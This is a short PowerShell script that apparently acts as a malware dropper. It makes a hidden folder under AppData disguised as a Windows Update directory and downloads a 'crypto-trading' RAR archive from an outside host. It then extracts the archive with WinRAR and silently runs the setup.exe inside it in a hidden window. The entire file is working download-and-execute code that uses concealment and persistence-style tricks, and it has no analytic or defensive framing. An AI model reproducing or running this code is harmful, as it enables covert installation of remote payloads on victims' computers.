# Create a hidden directory in AppData
$persistenceDir = "$env:APPDATA\Microsoft\Windows\Update"
if (-not (Test-Path $persistenceDir)) {
    New-Item -ItemType Directory -Path $persistenceDir -Force | Out-Null
    attrib +h $persistenceDir
}

echo "Downloading payload..."
# Download the payload
$payloadUrl = "https://crypto.harrylee.id.vn/crypto-trading.rar"
$payloadPath = "$persistenceDir\crypto-trading.rar"

try {
    # Set TLS 1.2
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    echo "Attempting to download from URL: $payloadUrl"
    # Download the RAR file
    Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -ErrorAction Stop
    
    if (-not (Test-Path $payloadPath)) {
        echo "Error: Failed to download RAR file"
        exit 1
    }
    
    echo "Successfully downloaded RAR file"
    echo "File size: $((Get-Item $payloadPath).Length) bytes"
} catch {
    echo "Error during download: $_"
    exit 1
}

# Extract the RAR file
$extractPath = "$persistenceDir\crypto-trading"
if (-not (Test-Path $extractPath)) {
    New-Item -ItemType Directory -Path $extractPath -Force | Out-Null
    attrib +h $extractPath
}

# Use WinRAR command line to extract
$winrarPath = "${env:ProgramFiles}\WinRAR\WinRAR.exe"
if (Test-Path $winrarPath) {
    & $winrarPath x -y $payloadPath $extractPath
} else {
    # Try 64-bit path
    $winrarPath = "${env:ProgramFiles(x86)}\WinRAR\WinRAR.exe"
    if (Test-Path $winrarPath) {
        & $winrarPath x -y $payloadPath $extractPath
    } else {
        echo "Error: WinRAR not found. Please install WinRAR."
        exit 1
    }
}

# Verify setup.exe exists in extracted folder
$setupPath = "$extractPath\setup.exe"
if (-not (Test-Path $setupPath)) {
    echo "Error: setup.exe not found in extracted folder"
    exit 1
}

# Execute setup.exe
echo "Executing setup.exe..."
Start-Process -FilePath $setupPath -WindowStyle Hidden
echo "setup.exe executed successfully"
